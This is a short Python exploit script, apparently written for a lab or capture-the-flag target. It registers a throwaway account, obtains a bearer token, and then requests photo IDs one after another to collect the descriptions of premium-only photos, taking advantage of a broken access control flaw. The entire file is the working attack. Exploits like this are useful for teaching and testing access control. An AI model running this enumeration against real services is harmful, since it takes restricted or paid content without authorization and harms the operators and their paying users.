import sys
import requests
from utils import generate_email, generate_string
from utils.auth import get_user_token, register_user

# Gather premium photos descriptions with user credentials
def get_premium_photos_descriptions(url: str, user_token: str) -> list[str]:
    headers = {
        'Authorization': f'Bearer {user_token}'
    }
    premium_descriptions: list = []
    photo_id: int = 1
    while True:
        resp = requests.get(f'{url}/photo/{photo_id}/file', headers=headers)
        if resp.status_code != 200:
            break
        image = resp.json()
        if image.get('premium_only', False):
            premium_descriptions.append(image.get('description', ''))
        
        photo_id += 1
    
    return premium_descriptions


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: broken_access_control.py <url>')
    url = sys.argv[1]

    user = {
        'email': generate_email(),
        'password': generate_string(8)
    }
    register_user(url, user)
    user_token = get_user_token(url, user)
    print(get_premium_photos_descriptions(url, user_token))
